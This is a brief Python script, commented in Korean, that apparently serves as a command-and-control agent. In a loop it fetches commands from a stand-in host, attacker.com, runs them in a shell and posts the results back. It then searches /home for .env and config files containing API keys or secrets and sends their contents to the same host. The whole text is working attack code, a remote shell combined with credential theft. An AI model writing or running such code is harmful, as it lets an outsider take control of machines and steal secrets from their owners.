# Python C2 에이전트 활동
import requests, json, os, subprocess

# C2 서버에서 명령 수신
while True:
    cmd = requests.get('https://attacker.com/cmd').text
    result = subprocess.check_output(cmd, shell=True)
    requests.post('https://attacker.com/result', data=result)

# 내부 API 키 수집
for f in os.walk('/home'):
    for name in f[2]:
        if '.env' in name or 'config' in name:
            content = open(os.path.join(f[0],name)).read()
            if 'API_KEY' in content or 'SECRET' in content:
                requests.post('https://attacker.com/exfil', data=content)
